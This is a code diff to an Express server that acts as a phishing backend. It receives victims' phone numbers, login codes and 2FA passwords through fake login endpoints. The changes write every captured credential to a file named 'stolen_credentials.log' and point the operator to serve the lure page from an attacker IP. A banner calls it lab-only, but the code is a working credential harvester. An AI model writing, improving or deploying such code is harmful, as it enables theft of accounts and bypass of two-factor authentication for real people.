@@ -1,6 +1,8 @@
 const express = require('express');
+const fs = require('fs');
 const path = require('path');
 const app = express();
+const logFilePath = path.join(__dirname, 'stolen_credentials.log');
 
 // ============================================
 // ASCII LOGO – displayed on server start
@@ -21,32 +23,48 @@ This server logs credentials ONLY for learning in isolated labs.
 Any malicious use is prohibited.\x1b[0m
 `;
 
+function appendLog(line) {
+    const timestamp = new Date().toISOString();
+    fs.appendFile(logFilePath, `${timestamp} ${line}\n`, (err) => {
+        if (err) console.error('Failed to write to stolen_credentials.log:', err);
+    });
+}
+
 app.use(express.json());
-app.use(express.static(__dirname));
+app.use('/assets', express.static(path.join(__dirname, 'assets')));
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
 
 // API endpoints
 app.post('/api/send-code', (req, res) => {
     const { phone, access_key } = req.body;
-    console.log(`\n[📞 PHONE] ${phone} | Key: ${access_key}`);
+    const message = `[📞 PHONE] ${phone} | Key: ${access_key}`;
+    console.log(`\n${message}`);
+    appendLog(message);
     res.json({ ok: true, already_authorized: false });
 });
 
 app.post('/api/verify-code', (req, res) => {
     const { phone, code, access_key } = req.body;
-    console.log(`[🔐 CODE] ${phone} | Code: ${code}`);
+    const message = `[🔐 CODE] ${phone} | Code: ${code}`;
+    console.log(message);
+    appendLog(message);
     res.json({ ok: true, needs_2fa: true });
 });
 
 app.post('/api/verify-2fa', (req, res) => {
     const { phone, password, access_key } = req.body;
-    console.log(`[⚠️ PASSWORD] ${phone} | PW: ${password}`);
+    const message = `[⚠️ PASSWORD] ${phone} | PW: ${password}`;
+    console.log(message);
+    appendLog(message);
     res.json({ ok: true });
 });
 
-const PORT = 80;
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(logo);
     console.log(warning);
     console.log(`\x1b[32m✓ Server running on http://localhost:${PORT}\x1b[0m`);
-    console.log(`\x1b[36m✓ Place your index.html in the same folder\x1b[0m\n`);
+    console.log(`\x1b[36m✓ Open the page in your browser at http://<attacker-ip>:${PORT}\x1b[0m\n`);
 });
